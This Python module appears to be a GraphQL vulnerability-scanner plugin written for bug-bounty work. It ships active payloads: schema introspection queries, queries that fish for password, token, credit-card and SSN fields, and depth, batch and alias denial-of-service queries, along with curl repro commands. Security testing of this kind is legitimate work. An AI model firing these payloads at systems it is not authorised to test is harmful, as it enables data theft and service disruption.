"""
GraphQL Injection Vulnerability Detector
Detects GraphQL API vulnerabilities and misconfigurations
Reward potential: $1000-5000+

Detection techniques:
- Introspection query detection (schema disclosure)
- Depth limit bypass testing
- Batch query attacks
- Authorization bypass attempts
- Field suggestion abuse
- Directive overloading

CWE: CWE-89 (Improper Neutralization of Special Elements in Data Query Logic)
OWASP: A03:2021 - Injection
"""

import asyncio
import re
import json
from .registry import register_active

# GraphQL endpoint patterns
GRAPHQL_ENDPOINT_PATTERNS = [
    r'/graphql',
    r'/api/graphql',
    r'/v\d+/graphql',
    r'/query',
    r'/gql',
]

# Introspection query to discover schema
INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        description
        type {
          name
          kind
        }
      }
    }
  }
}
"""

# Simple introspection queries
SIMPLE_INTROSPECTION_QUERIES = [
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{__type(name:\\"Query\\"){fields{name}}}"}',
    '{"query":"query{__schema{queryType{name}}}"}',
]

# Queries to test for common sensitive fields
SENSITIVE_FIELD_QUERIES = [
    '{"query":"{users{id email password}}"}',
    '{"query":"{user{id username email password token}}"}',
    '{"query":"{admin{id email password}}"}',
    '{"query":"{customers{id email creditCard}}"}',
    '{"query":"{accounts{id email ssn}}"}',
]

# Depth limit bypass - nested queries
DEPTH_LIMIT_BYPASS = """
{
  user {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    id
                    email
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
"""

# Batch query attack - multiple queries in one request
BATCH_QUERY_ATTACK = """
{
  query1: users { id }
  query2: users { id }
  query3: users { id }
  query4: users { id }
  query5: users { id }
  query6: users { id }
  query7: users { id }
  query8: users { id }
  query9: users { id }
  query10: users { id }
}
"""

# Alias-based DoS
ALIAS_DOS_QUERY = """
{
  """ + '\n  '.join([f'alias{i}: __typename' for i in range(100)]) + """
}
"""

# Common GraphQL error messages
GRAPHQL_ERROR_INDICATORS = [
    'graphql',
    'syntax error',
    'cannot query field',
    'unknown argument',
    'type mismatch',
    'validation error',
    '__schema',
    '__type',
    'introspection',
]


def is_graphql_endpoint(url):
    """Check if URL is likely a GraphQL endpoint"""
    url_lower = url.lower()
    return any(pattern in url_lower for pattern in GRAPHQL_ENDPOINT_PATTERNS)


def contains_graphql_error(response_text):
    """Check if response contains GraphQL error messages"""
    response_lower = response_text.lower()
    return any(indicator in response_lower for indicator in GRAPHQL_ERROR_INDICATORS)


def extract_schema_types(response_text):
    """Extract type names from introspection response"""
    try:
        data = json.loads(response_text)

        # Look for schema types
        if 'data' in data and '__schema' in data['data']:
            types = data['data']['__schema'].get('types', [])
            return [t['name'] for t in types if isinstance(t, dict) and 'name' in t]

        # Look for type fields
        if 'data' in data and '__type' in data['data']:
            fields = data['data']['__type'].get('fields', [])
            return [f['name'] for f in fields if isinstance(f, dict) and 'name' in f]

    except (json.JSONDecodeError, KeyError, TypeError):
        pass

    return []


def extract_sensitive_data(response_text):
    """Check if response contains sensitive field names"""
    sensitive_fields = ['password', 'token', 'secret', 'apikey', 'api_key',
                        'creditcard', 'credit_card', 'ssn', 'private']

    response_lower = response_text.lower()
    found_fields = [field for field in sensitive_fields if field in response_lower]

    return found_fields


@register_active
async def graphql_injection_detector(session, url, context):
    """
    Detect GraphQL injection vulnerabilities and misconfigurations

    Tests:
    1. Introspection query (schema disclosure)
    2. Sensitive field access without authentication
    3. Depth limit bypass
    4. Batch query attacks
    5. Authorization bypass
    6. Field suggestion enumeration

    Returns list of GraphQL vulnerability findings
    """
    findings = []

    try:
        # Check if this is a GraphQL endpoint
        if not is_graphql_endpoint(url):
            # Try to detect if it responds to GraphQL queries anyway
            test_query = '{"query":"{__typename}"}'
            try:
                test_response = await session.post(
                    url,
                    data=test_query,
                    headers={'Content-Type': 'application/json'},
                    allow_redirects=False,
                    timeout=5
                )
                test_text = await test_response.text()

                if not contains_graphql_error(test_text) and '__typename' not in test_text:
                    return findings
            except Exception:
                return findings

        # Test 1: Introspection query (schema disclosure)
        for introspection_query in SIMPLE_INTROSPECTION_QUERIES:
            try:
                response = await session.post(
                    url,
                    data=introspection_query,
                    headers={'Content-Type': 'application/json'},
                    allow_redirects=False,
                    timeout=10
                )

                response_text = await response.text()

                # Check if introspection is enabled
                schema_types = extract_schema_types(response_text)

                if schema_types:
                    findings.append({
                        'type': 'GraphQL - Introspection Enabled',
                        'severity': 'high',
                        'confidence': 'high',
                        'url': url,
                        'method': 'POST',
                        'evidence': f'GraphQL introspection is enabled! Schema types disclosed: {", ".join(schema_types[:20])}{"..." if len(schema_types) > 20 else ""}. Total {len(schema_types)} types found. Attackers can map the entire API structure, discover hidden endpoints, and identify sensitive fields.',
                        'query': introspection_query,
                        'schema_types': schema_types[:50],
                        'total_types': len(schema_types),
                        'response_status': response.status,
                        'cvss_score': 7.5,
                        'cwe': 'CWE-200',
                        'impact': 'GraphQL introspection exposes complete API schema including all types, fields, and relationships. Attackers can discover sensitive fields (passwords, tokens), hidden admin endpoints, and internal API structure. This enables targeted attacks and complete API mapping.',
                        'recommendation': '1. Disable introspection in production environments\n2. Implement proper authentication before allowing introspection\n3. Use schema allowlisting instead of exposing full schema\n4. Add rate limiting to GraphQL endpoints\n5. Monitor for introspection query attempts\n6. Consider using persisted queries only',
                        'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{introspection_query}\'',
                    })

                    # Found introspection, don't need to test other queries
                    break

            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

        # Test 2: Access to sensitive fields without auth
        for sensitive_query in SENSITIVE_FIELD_QUERIES:
            try:
                response = await session.post(
                    url,
                    data=sensitive_query,
                    headers={'Content-Type': 'application/json'},
                    allow_redirects=False,
                    timeout=10
                )

                response_text = await response.text()

                # Check if we got data back (not just errors)
                if '"data"' in response_text and '"errors"' not in response_text:
                    # Check for sensitive field names in response
                    sensitive_fields = extract_sensitive_data(response_text)

                    if sensitive_fields:
                        findings.append({
                            'type': 'GraphQL - Sensitive Data Exposure',
                            'severity': 'critical',
                            'confidence': 'high',
                            'url': url,
                            'method': 'POST',
                            'evidence': f'GraphQL query returned sensitive data without authentication! Query for users/accounts returned fields: {", ".join(sensitive_fields)}. Response contains sensitive information that should be protected. Response excerpt: {response_text[:300]}',
                            'query': sensitive_query,
                            'sensitive_fields': sensitive_fields,
                            'response_status': response.status,
                            'response_length': len(response_text),
                            'cvss_score': 9.1,
                            'cwe': 'CWE-862',
                            'impact': 'Critical! GraphQL API exposes sensitive user data without proper authorization. Attackers can query for passwords, tokens, credit cards, SSN, or other PII. This can lead to account takeover, identity theft, and massive data breach.',
                            'recommendation': '1. Implement field-level authorization\n2. Require authentication for all sensitive queries\n3. Use query depth limiting\n4. Implement field allow-listing\n5. Add audit logging for sensitive field access\n6. Consider using @auth directives',
                            'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{sensitive_query}\'',
                        })
                        break

            except asyncio.TimeoutError:
                continue
            except Exception:
                continue

        # Test 3: Depth limit bypass
        depth_payload = json.dumps({"query": DEPTH_LIMIT_BYPASS})
        try:
            response = await session.post(
                url,
                data=depth_payload,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False,
                timeout=15
            )

            response_text = await response.text()

            # If query succeeds (no depth limit error), it's vulnerable
            if response.status == 200 and '"data"' in response_text and 'depth' not in response_text.lower():
                findings.append({
                    'type': 'GraphQL - No Depth Limit',
                    'severity': 'medium',
                    'confidence': 'medium',
                    'url': url,
                    'method': 'POST',
                    'evidence': f'GraphQL API has no depth limit! Deeply nested query (8+ levels) was executed successfully. This can be exploited for DoS attacks by sending extremely deep queries that consume server resources.',
                    'query': DEPTH_LIMIT_BYPASS[:200] + '...',
                    'response_status': response.status,
                    'cvss_score': 6.5,
                    'cwe': 'CWE-400',
                    'impact': 'GraphQL API lacks depth limiting, allowing attackers to send deeply nested queries that can cause denial of service, consume excessive server resources, and degrade performance for legitimate users.',
                    'recommendation': '1. Implement query depth limiting (max 5-10 levels)\n2. Add query complexity analysis\n3. Set maximum query depth in GraphQL server config\n4. Use query cost analysis\n5. Implement rate limiting',
                    'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{{...deeply nested query...}}\'',
                })

        except asyncio.TimeoutError:
            # Timeout might indicate successful DoS
            findings.append({
                'type': 'GraphQL - Query Timeout (Possible DoS)',
                'severity': 'medium',
                'confidence': 'low',
                'url': url,
                'method': 'POST',
                'evidence': 'Deeply nested GraphQL query caused server timeout. This may indicate vulnerability to DoS attacks via complex queries.',
                'cvss_score': 5.5,
                'cwe': 'CWE-400',
                'impact': 'Potential DoS vulnerability via complex GraphQL queries.',
                'recommendation': 'Implement query depth and complexity limits',
                'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" --max-time 15',
            })
        except Exception:
            pass

        # Test 4: Batch query attack
        batch_payload = json.dumps({"query": BATCH_QUERY_ATTACK})
        try:
            response = await session.post(
                url,
                data=batch_payload,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False,
                timeout=10
            )

            response_text = await response.text()

            # Count how many aliased queries returned data
            alias_count = len(re.findall(r'"query\d+"', response_text))

            if alias_count > 5:
                findings.append({
                    'type': 'GraphQL - Batch Query Attack',
                    'severity': 'medium',
                    'confidence': 'medium',
                    'url': url,
                    'method': 'POST',
                    'evidence': f'GraphQL API allows batch queries! {alias_count} aliased queries executed in single request. This can be exploited to bypass rate limiting, amplify attacks, and extract large amounts of data.',
                    'query': 'Batch query with 10+ aliases',
                    'successful_aliases': alias_count,
                    'response_status': response.status,
                    'cvss_score': 6.1,
                    'cwe': 'CWE-770',
                    'impact': 'Batch query support allows attackers to bypass rate limits by sending multiple queries in one request, amplify brute force attacks, and extract large datasets efficiently.',
                    'recommendation': '1. Disable query batching or limit batch size\n2. Implement query cost analysis\n3. Add per-query rate limiting\n4. Monitor for suspicious batch patterns\n5. Consider using persisted queries only',
                    'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{{query: "{{ alias1: users{{id}} alias2: users{{id}} ... }}"}}\'',
                })

        except Exception:
            pass

        # Test 5: Alias-based DoS
        alias_payload = json.dumps({"query": ALIAS_DOS_QUERY})
        try:
            import time
            start = time.time()

            response = await session.post(
                url,
                data=alias_payload,
                headers={'Content-Type': 'application/json'},
                allow_redirects=False,
                timeout=10
            )

            elapsed = time.time() - start
            response_text = await response.text()

            # If server takes long time or returns all aliases
            if elapsed > 3.0 or response_text.count('alias') > 50:
                findings.append({
                    'type': 'GraphQL - Alias DoS Vulnerability',
                    'severity': 'medium',
                    'confidence': 'medium',
                    'url': url,
                    'method': 'POST',
                    'evidence': f'GraphQL API vulnerable to alias-based DoS! Query with 100 aliases took {elapsed:.2f}s to process. Attackers can send queries with thousands of aliases to consume server resources.',
                    'query': 'Query with 100 aliases',
                    'response_time': f'{elapsed:.2f}s',
                    'response_status': response.status,
                    'cvss_score': 5.8,
                    'cwe': 'CWE-400',
                    'impact': 'GraphQL API allows unlimited query aliasing, enabling DoS attacks where attackers can request the same field thousands of times under different aliases, consuming excessive server resources.',
                    'recommendation': '1. Limit number of aliases per query\n2. Implement query complexity scoring\n3. Add timeout limits\n4. Use query cost analysis before execution',
                    'repro_command': f'curl -X POST "{url}" -H "Content-Type: application/json" -d \'{{...100 aliases...}}\'',
                })

        except asyncio.TimeoutError:
            pass
        except Exception:
            pass

    except Exception:
        pass

    return findings
